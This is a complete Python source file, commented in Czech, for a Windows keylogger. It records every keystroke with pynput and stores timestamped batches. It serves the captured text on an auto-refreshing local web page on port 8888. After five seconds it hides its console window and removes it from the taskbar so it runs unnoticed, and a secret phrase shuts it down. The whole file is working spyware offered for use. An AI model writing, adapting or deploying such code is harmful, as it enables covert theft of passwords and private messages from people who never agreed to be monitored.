import pynput.keyboard
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import time
import os
import ctypes
import sys

class KeyloggerWithServer:
    def __init__(self, time_interval=30, exit_phrase="terminate", port=8888):
        self.log = ""
        self.interval = time_interval
        self.exit_phrase = exit_phrase
        self.is_running = True
        self.port = port
        self.captured_data = []  # Ukládá všechny zachycené data
        self.server_thread = None
        
    def get_local_ip(self):
        """Získá lokální IP adresu"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def hide_console(self):
        """Kompletně skryje konzolové okno z hlavní liště"""
        try:
            # Získání handle konzolového okna
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                # Kompletně skryje okno z hlavní liště
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
                
                # Odstraní z hlavní liště (taskbar)
                GWL_EXSTYLE = -20
                WS_EX_TOOLWINDOW = 0x00000080
                current_style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
                ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, current_style | WS_EX_TOOLWINDOW)
                
        except Exception as e:
            pass  # Pokud selže, program pokračuje normálně
    
    def append_to_log(self, string):
        self.log += string
        # Kontrola exit fráze
        if self.exit_phrase in self.log.lower():
            print(f"Exit fráze '{self.exit_phrase}' detekována. Ukončuji program...")
            self.stop()
    
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = " [ENTER] "
            elif key == key.backspace:
                current_key = " [BACKSPACE] "
            else:
                current_key = f" [{key}] "
        self.append_to_log(current_key)
    
    def report(self):
        if self.log:
            # Přidá do seznamu zachycených dat
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            self.captured_data.append(f"[{timestamp}] {self.log}")
            self.log = ""
        
        if self.is_running:
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()
    
    class RequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            keylogger = self.server.keylogger
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # HTML stránka s výsledky
            html = f"""
            <html>
            <head>
                <title>Keylogger Results</title>
                <meta charset="utf-8">
                <style>
                    body {{ font-family: Arial; margin: 20px; background: #f0f0f0; }}
                    .container {{ background: white; padding: 20px; border-radius: 10px; }}
                    .entry {{ margin: 10px 0; padding: 10px; background: #e9e9e9; border-radius: 5px; }}
                    .timestamp {{ color: #666; font-size: 0.9em; }}
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>📝 Keylogger Results</h1>
                    <p>Zachycená data v reálném čase:</p>
                    <div id="results">
            """
            
            for entry in reversed(keylogger.captured_data[-100:]):  # Posledních 100 záznamů
                html += f'<div class="entry"><span class="timestamp">{entry.split("]")[0]}]</span> {entry.split("]")[1]}</div>'
            
            html += """
                    </div>
                    <p><em>Automaticky se obnovuje každých 5 sekund</em></p>
                    <p><strong>Pro ukončení napište: {exit_phrase}</strong></p>
                </div>
                <script>
                    setTimeout(function() {{
                        location.reload();
                    }}, 5000);
                </script>
            </body>
            </html>
            """.format(exit_phrase=keylogger.exit_phrase)
            
            self.wfile.write(html.encode('utf-8'))
        
        def log_message(self, format, *args):
            # Potlačí logování HTTP požadavků
            return
    
    def start_server(self):
        """Spustí HTTP server v samostatném vlákně"""
        class CustomHTTPServer(HTTPServer):
            def __init__(self, *args, **kwargs):
                HTTPServer.__init__(self, *args, **kwargs)
                self.keylogger = self.RequestHandlerClass.keylogger
        
        self.RequestHandler.keylogger = self
        
        # Použijeme pouze lokální přístup pro větší bezpečnost
        server = CustomHTTPServer(('127.0.0.1', self.port), self.RequestHandler)
        print(f"🚀 Server běží na: http://{self.get_local_ip()}:{self.port}")
        print("⏳ Okno se zavře za 5 sekund a program poběží na pozadí...")
        print(f"📝 Pro ukončení napište: '{self.exit_phrase}'")
        server.serve_forever()
    
    def stop(self):
        """Elegantně ukončí program"""
        self.is_running = False
        print("Program se ukončuje...")
        # Počkáme chvíli než se ukončí vlákna
        time.sleep(1)
        os._exit(0)
    
    def start(self):
        # Spustí server v samostatném vlákně
        self.server_thread = threading.Thread(target=self.start_server)
        self.server_thread.daemon = True
        self.server_thread.start()
        
        # Spustí keylogger
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        keyboard_listener.daemon = True
        keyboard_listener.start()
        self.report()
        
        # Počká 5 sekund než skryje okno
        time.sleep(5)
        
        # Kompletně skryje konzolové okno
        self.hide_console()
        
        # Drží program běžící na pozadí
        while self.is_running:
            threading.Event().wait(1)

# Spuštění
if __name__ == "__main__":
    keylogger = KeyloggerWithServer(
        time_interval=10,
        exit_phrase="stopnow",  # Tajná fráze pro ukončení
        port=8888  # Můžeš změnit port
    )
    keylogger.start()
